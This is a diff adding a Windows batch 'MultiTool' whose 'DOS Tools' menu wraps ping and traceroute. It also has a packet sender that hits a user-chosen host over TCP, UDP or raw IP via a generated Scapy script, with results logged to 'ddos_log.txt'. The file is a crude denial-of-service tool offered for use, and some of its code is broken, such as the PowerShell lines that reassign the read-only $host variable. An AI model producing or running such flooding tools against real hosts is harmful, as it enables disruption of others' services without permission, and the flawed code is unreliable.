@@ -1,0 +1,169 @@
+@echo off
+title MultiTool Script
+color 0a
+
+:: Function to display fading text
+:fade_text
+setlocal
+set "text=%~1"
+set "colors=2 4 6 E 5"  :: Green, Red, Orange, Yellow, Purple
+for %%C in (%colors%) do (
+    powershell -Command "Write-Host '%text%' -ForegroundColor %%C -NoNewline"
+    timeout /t 1 /nobreak >nul
+)
+echo.
+endlocal
+goto :eof
+
+:menu
+cls
+call :fade_text "{/} - |_ /\ /|/ |) () /|/ - |\/| |_| |_ -|- () () |_"
+call :fade_text "{\} + Use wisely. I’m not responsible for your actions."
+call :fade_text "{/} + This tool can be ethical and unethical."
+call :fade_text "{\} + Don’t resell or modify my code. It’s not even worth it."
+call :fade_text "{/} + Do not use for or on websites, IPs, and other things without permission."
+call :fade_text "{\} -"
+call :fade_text "{/} -"
+call :fade_text "{\} -"
+call :fade_text "{/} -"
+call :fade_text "{\} -"
+call :fade_text "{/} -"
+call :fade_text "{\} -"
+echo.
+call :fade_text "1. DOS Tools"
+call :fade_text "2. Exit"
+echo.
+set /p choice=Choose an option (1-2): 
+
+if %choice%==1 goto dos
+if %choice%==2 exit
+
+:dos
+cls
+call :fade_text "{/} DOS Tools Menu"
+call :fade_text "{\} -----------------"
+call :fade_text "1. Ping a Host"
+call :fade_text "2. Traceroute"
+call :fade_text "3. Custom Packet Sender"
+call :fade_text "4. Back to Main Menu"
+echo.
+set /p dos_choice=Choose an option (1-4): 
+
+if %dos_choice%==1 goto ping
+if %dos_choice%==2 goto traceroute
+if %dos_choice%==3 goto packet_sender
+if %dos_choice%==4 goto menu
+
+:ping
+cls
+call :fade_text "{/} Ping a Host"
+call :fade_text "{\} -----------------"
+set /p host=Enter the host to ping (e.g., google.com): 
+ping %host%
+pause
+goto dos
+
+:traceroute
+cls
+call :fade_text "{/} Traceroute"
+call :fade_text "{\} -----------------"
+set /p host=Enter the host to trace (e.g., google.com): 
+tracert %host%
+pause
+goto dos
+
+:packet_sender
+cls
+call :fade_text "{/} Custom Packet Sender"
+call :fade_text "{\} -----------------"
+set /p host=Enter the target IP or website (e.g., 192.168.1.1 or google.com): 
+set /p packets=Enter the number of packets to send: 
+set /p delay=Enter the delay between packets (in milliseconds, default: 100): 
+if "%delay%"=="" set delay=100
+call :fade_text "Choose a protocol:"
+call :fade_text "1. TCP"
+call :fade_text "2. UDP"
+call :fade_text "3. Raw IP"
+echo.
+set /p protocol=Enter the protocol (1-3): 
+
+if %protocol%==1 goto tcp_sender
+if %protocol%==2 goto udp_sender
+if %protocol%==3 goto raw_ip_sender
+
+:tcp_sender
+call :fade_text "Sending %packets% TCP packets to %host% with a %delay% ms delay..."
+powershell -Command "$host = '%host%'; $packets = %packets%; $delay = %delay%; for ($i = 1; $i -le $packets; $i++) { Test-NetConnection -ComputerName $host -Port 80; Start-Sleep -Milliseconds $delay }"
+pause
+goto dos
+
+:udp_sender
+call :fade_text "Sending %packets% UDP packets to %host% with a %delay% ms delay..."
+powershell -Command "$host = '%host%'; $packets = %packets%; $delay = %delay%; for ($i = 1; $i -le $packets; $i++) { Test-NetConnection -ComputerName $host -Port 53 -UDP; Start-Sleep -Milliseconds $delay }"
+pause
+goto dos
+
+:raw_ip_sender
+cls
+call :fade_text "{/} Setting up Raw IP packet sending..."
+call :fade_text "{\} -----------------"
+call :fade_text "This will download and install Python and Scapy if not already installed."
+echo.
+call :fade_text "Step 1: Checking for Python..."
+python --version >nul 2>&1
+if %errorlevel%==0 (
+    call :fade_text "Python is already installed."
+) else (
+    call :fade_text "Python is not installed. Downloading and installing Python..."
+    powershell -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe -OutFile python-installer.exe"
+    call :fade_text "Installing Python..."
+    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
+    del python-installer.exe
+    call :fade_text "Python installed successfully."
+)
+
+call :fade_text "Step 2: Checking for Scapy..."
+pip show scapy >nul 2>&1
+if %errorlevel%==0 (
+    call :fade_text "Scapy is already installed."
+) else (
+    call :fade_text "Scapy is not installed. Installing Scapy..."
+    pip install scapy
+    call :fade_text "Scapy installed successfully."
+)
+
+call :fade_text "Step 3: Creating Python script to send Raw IP packets..."
+(
+echo import time
+echo from scapy.all import *
+echo target_ip = "%host%"
+echo num_packets = %packets%
+echo delay = %delay% / 1000
+echo total_data_sent = 0
+echo failed_packets = 0
+echo print("Live Counter ま")
+echo for i in range(num_packets):
+echo     try:
+echo         packet = IP(dst=target_ip)/Raw(load="Raw Packet Data")
+echo         send(packet, verbose=0)
+echo         total_data_sent += len(packet)
+echo         print(f"Packets sent: {i+1}/{num_packets} | Data sent: {total_data_sent} bytes | Failed: {failed_packets}", end="\r")
+echo     except Exception as e:
+echo         failed_packets += 1
+echo         print(f"Packets sent: {i+1}/{num_packets} | Data sent: {total_data_sent} bytes | Failed: {failed_packets}", end="\r")
+echo     time.sleep(delay)
+echo print(f"\nTotal packets sent: {num_packets} | Total data sent: {total_data_sent} bytes | Total failed: {failed_packets}")
+echo with open("ddos_log.txt", "a") as log_file:
+echo     log_file.write(f"Target: {target_ip}\n")
+echo     log_file.write(f"Total packets sent: {num_packets}\n")
+echo     log_file.write(f"Total data sent: {total_data_sent} bytes\n")
+echo     log_file.write(f"Total failed packets: {failed_packets}\n")
+echo     log_file.write(f"Timestamp: {time.ctime()}\n")
+echo     log_file.write("-" * 40 + "\n")
+) > send_raw.py
+
+call :fade_text "Python script saved as send_raw.py."
+call :fade_text "Running Python script..."
+python send_raw.py
+pause
+goto dos
